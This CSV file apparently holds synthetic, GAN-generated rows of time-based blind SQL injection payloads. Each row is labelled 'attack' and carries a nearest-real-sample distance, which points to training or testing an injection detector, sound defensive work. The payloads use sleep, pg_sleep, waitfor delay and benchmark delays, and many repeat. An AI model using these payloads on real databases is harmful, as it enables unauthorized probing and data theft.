id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000021,attack,time,1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000309,7.291623013445634
CTGAN_000022,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,5.987171107734606
CTGAN_000023,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,5.751033220788927
CTGAN_000024,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000489,7.831050993827648
CTGAN_000025,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000766,6.224967702213927
CTGAN_000026,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,5.712503790170818
CTGAN_000027,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.7166919417570465
CTGAN_000028,attack,time,"1%' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and '%'  =  '",nearest_attack_euclidean,R000521,7.000019265055454
CTGAN_000029,attack,time,1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000165,8.143512854100226
CTGAN_000030,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,7.929656963684518
CTGAN_000031,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,5.939551489306893
CTGAN_000032,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000972,6.8230366301043714
CTGAN_000033,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000962,4.44289622259477
CTGAN_000034,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,6.218466576702364
CTGAN_000035,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,5.740708312870871
CTGAN_000036,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000761,5.921611857052817
CTGAN_000037,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,4.959310937763311
CTGAN_000038,attack,time,select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa,nearest_attack_euclidean,R000847,4.772502275071137
CTGAN_000039,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.9069800677041275
CTGAN_000040,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.394976962230176
CTGAN_000041,attack,time,1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000724,5.356064980558412
CTGAN_000042,attack,time,1   )    )    rlike sleep  (  5  )   and    (    (   8773  =  8773,nearest_attack_euclidean,R000308,4.782143067541747
CTGAN_000043,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl,nearest_attack_euclidean,R000482,5.498618950206137
CTGAN_000044,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,6.813929514224198
CTGAN_000045,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,5.378556468271322
CTGAN_000046,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,5.513286125059254
CTGAN_000047,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R000591,6.551465520625256
CTGAN_000048,attack,time,"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""%""  =  """,nearest_attack_euclidean,R001186,7.176682740781502
CTGAN_000049,attack,time,"waitfor delay '0:0:5' and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000878,6.65328809039379
CTGAN_000050,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,5.890436028244378
CTGAN_000051,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,7.215133822097753
CTGAN_000052,attack,time,"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",nearest_attack_euclidean,R000852,6.242278585561922
CTGAN_000053,attack,time,1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000983,5.8048537463756125
CTGAN_000054,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000843,7.341072711897898
CTGAN_000055,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R001026,5.859684817022416
CTGAN_000056,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,4.95918196322356
CTGAN_000057,attack,time,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000353,7.429682829930312
CTGAN_000058,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R001119,6.4508447060261185
CTGAN_000059,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,5.434304506146503
CTGAN_000060,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000857,6.1760060836613455
CTGAN_000061,attack,time,"1' in boolean mode  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000931,6.488631078339769
CTGAN_000062,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim",nearest_attack_euclidean,R000828,5.661737432088857
CTGAN_000063,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R001026,5.015230182004575
CTGAN_000064,attack,time,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000353,6.663017681024807
CTGAN_000065,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.279509111368416
CTGAN_000066,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",nearest_attack_euclidean,R001018,5.212443006881358
CTGAN_000067,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R000261,6.545116597632657
CTGAN_000068,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000440,6.355967882166026
CTGAN_000069,attack,time,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000353,6.162841033734229
CTGAN_000070,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R000663,5.582363445147381
CTGAN_000071,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R000352,6.9005520830781215
CTGAN_000072,attack,time,select sleep  (  5  )   and   (  4863  =  4863,nearest_attack_euclidean,R000832,5.824354689140684
CTGAN_000073,attack,time,"1'+  (  select oogh where 1167  =  1167 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R001034,6.5690954778769335
CTGAN_000074,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,4.788799298485584
CTGAN_000075,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni",nearest_attack_euclidean,R001103,5.299511889138926
CTGAN_000076,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000607,6.81809422738148
CTGAN_000077,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,5.99393320632238
CTGAN_000078,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,5.908493637858697
CTGAN_000079,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,4.835182088841533
CTGAN_000080,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001046,7.577826355734239
CTGAN_000081,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,5.7987207084037005
CTGAN_000082,attack,time,select sleep  (  5  )   and    (    (     (  'klma'  =  'klma,nearest_attack_euclidean,R000865,4.807746078762211
CTGAN_000083,attack,time,1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000472,7.1331947420680875
CTGAN_000084,attack,time,1' rlike sleep  (  5  )   and 'gtfo'  =  'gtfo,nearest_attack_euclidean,R000301,4.35291626687566
CTGAN_000085,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,6.133665692452188
CTGAN_000086,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000211,4.740717727952684
CTGAN_000087,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,5.912320233939086
CTGAN_000088,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,6.8612280713990845
CTGAN_000089,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000418,5.9887337650301475
CTGAN_000090,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000649,7.385586626212382
CTGAN_000091,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000579,7.700402385245351
CTGAN_000092,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",nearest_attack_euclidean,R000556,6.594115689069895
CTGAN_000093,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,7.395810133991056
CTGAN_000094,attack,time,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000353,6.361438832102468
CTGAN_000095,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000761,5.762049106282503
CTGAN_000096,attack,time,"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000609,6.842699732095781
CTGAN_000097,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,6.897889694644705
CTGAN_000098,attack,time,"1""  )   and sleep  (  5  )  #",nearest_attack_euclidean,R000862,6.512046420264717
CTGAN_000099,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,5.298851617744682
CTGAN_000100,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""phcl"" like ""phcl",nearest_attack_euclidean,R001018,4.3385880300276005
CTGAN_000101,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'krrr'  =  'krrr,nearest_attack_euclidean,R000821,5.293194626055027
CTGAN_000102,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R000365,5.712699326321869
CTGAN_000103,attack,time,1   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001162,6.200295737392799
CTGAN_000104,attack,time,1' where 5455  =  5455 and sleep  (  5  )  --,nearest_attack_euclidean,R000642,6.6384465798755405
CTGAN_000105,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.62615147864474
CTGAN_000106,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,4.40666607684609
CTGAN_000107,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'obwn'  =  'obwn,nearest_attack_euclidean,R000285,6.055859519037287
CTGAN_000108,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000759,5.726247649114993
CTGAN_000109,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000085,5.97277862112911
CTGAN_000110,attack,time,select sleep  (  5   )    )   ||',nearest_attack_euclidean,R000348,7.0846331656166965
CTGAN_000111,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,6.35554764540038
CTGAN_000112,attack,time,"1""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000969,5.078662028445302
CTGAN_000113,attack,time,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000699,6.751717294515306
CTGAN_000114,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.451579311478021
CTGAN_000115,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000834,5.418058313135258
CTGAN_000116,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000590,5.083928822761592
CTGAN_000117,attack,time,1' where 9024  =  9024 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R001168,6.411295958028741
CTGAN_000118,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,6.073298356580726
CTGAN_000119,attack,time,1'  )   where 7908  =  7908 or sleep  (  5  )  --,nearest_attack_euclidean,R000103,7.483083713484405
CTGAN_000120,attack,time,"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry",nearest_attack_euclidean,R001080,4.844571160989895
CTGAN_000121,attack,time,1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  ',nearest_attack_euclidean,R000579,5.341284407084595
CTGAN_000122,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  acdk  )  #,nearest_attack_euclidean,R000805,6.961699215233707
CTGAN_000123,attack,time,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000875,5.367966638234481
CTGAN_000124,attack,time,"1%""   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000882,6.340240230883974
CTGAN_000125,attack,time,1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R001050,9.328679877059574
CTGAN_000126,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000645,7.405527695692178
CTGAN_000127,attack,time,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",nearest_attack_euclidean,R000975,5.171929347733129
CTGAN_000128,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000246,6.763129515232709
CTGAN_000129,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R000367,6.909140403658526
CTGAN_000130,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000803,7.232843095739911
CTGAN_000131,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001054,4.89315225183289
CTGAN_000132,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000264,6.840630110873995
CTGAN_000133,attack,time,"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",nearest_attack_euclidean,R000450,6.253598451019559
CTGAN_000134,attack,time,"1%""  )   and sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000714,6.874291800135407
CTGAN_000135,attack,time,select sleep  (  5  )   and   (  'qcsv'  =  'qcsv,nearest_attack_euclidean,R001077,6.802964601006462
CTGAN_000136,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000530,6.1422691454070115
CTGAN_000137,attack,time,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",nearest_attack_euclidean,R000678,6.407419709865758
CTGAN_000138,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.539371675267017
CTGAN_000139,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,6.027917337254838
CTGAN_000140,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,5.735781715843111
CTGAN_000141,attack,time,select pg_sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R000811,6.307423690931841
CTGAN_000142,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000244,6.699178950186079
CTGAN_000143,attack,time,"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",nearest_attack_euclidean,R000450,5.187134336144154
CTGAN_000144,attack,time,"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000109,4.84098265743763
CTGAN_000145,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,8.848216011997978
CTGAN_000146,attack,time,"1""   )    )    as dpln where 4193  =  4193 rlike sleep  (  5  )  --",nearest_attack_euclidean,R001066,5.323732086528764
CTGAN_000147,attack,time,"1  )   as rnfb where 2405  =  2405 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000798,6.084651641711026
CTGAN_000148,attack,time,"1""   )    )     )   waitfor delay '0:0:5' and    (    (     (  ""ckht""  =  ""ckht",nearest_attack_euclidean,R001085,9.08133013150611
CTGAN_000149,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,6.2597040302827045
CTGAN_000150,attack,time,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000699,4.836719986060249
CTGAN_000151,attack,time,1   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001162,7.53786197775205
CTGAN_000152,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R001048,7.013994272892463
CTGAN_000153,attack,time,1  )   waitfor delay '0:0:5' and   (  2993  =  2993,nearest_attack_euclidean,R000205,5.521887049505682
CTGAN_000154,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,6.284281497320596
CTGAN_000155,attack,time,select sleep  (  5  )   and    (    (     (  8354  =  8354,nearest_attack_euclidean,R000756,5.510033069971006
CTGAN_000156,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,6.121410096136704
CTGAN_000157,attack,time,1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,nearest_attack_euclidean,R000710,6.151431386250632
CTGAN_000158,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""twmy""  =  ""twmy",nearest_attack_euclidean,R000082,6.716020618794837
CTGAN_000159,attack,time,"1' where 4334  =  4334 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000478,4.49490390126798
CTGAN_000160,attack,time,"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",nearest_attack_euclidean,R000852,6.170131080472858
CTGAN_000161,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,5.760829279503898
CTGAN_000162,attack,time,1  )   waitfor delay '0:0:5' and   (  2993  =  2993,nearest_attack_euclidean,R000205,6.243115645523475
CTGAN_000163,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R001119,5.214399839916799
CTGAN_000164,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R001038,5.183915460690243
CTGAN_000165,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,4.782924896450242
CTGAN_000166,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,6.413956634117967
CTGAN_000167,attack,time,"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000231,6.321237660384534
CTGAN_000168,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,6.648669679204658
CTGAN_000169,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,4.115454438646799
CTGAN_000170,attack,time,select pg_sleep  (  5  )   and    (    (   4382  =  4382,nearest_attack_euclidean,R000419,5.151184936638691
CTGAN_000171,attack,time,"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000860,6.589055476563777
CTGAN_000172,attack,time,"1""   )    )    as dpln where 4193  =  4193 rlike sleep  (  5  )  --",nearest_attack_euclidean,R001066,5.517158928330571
CTGAN_000173,attack,time,"select sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000152,7.6554494961558435
CTGAN_000174,attack,time,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000325,6.208369789947967
CTGAN_000175,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000227,5.870975846689425
CTGAN_000176,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000401,5.9717912298371045
CTGAN_000177,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  7015  =  7015,nearest_attack_euclidean,R000435,5.096251011721712
CTGAN_000178,attack,time,waitfor delay '0:0:5' and    (    (     (  8981  =  8981,nearest_attack_euclidean,R000429,6.043216863812783
CTGAN_000179,attack,time,"1%'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000668,5.015202037348966
CTGAN_000180,attack,time,select pg_sleep  (  5  )   and 'zfyy'  =  'zfyy,nearest_attack_euclidean,R000342,5.259550537428889
CTGAN_000181,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000601,5.133130581858955
CTGAN_000182,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000759,5.057231005344262
CTGAN_000183,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R000981,5.391676226802907
CTGAN_000184,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,5.5366110812578215
CTGAN_000185,attack,time,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,nearest_attack_euclidean,R000782,5.031607666066484
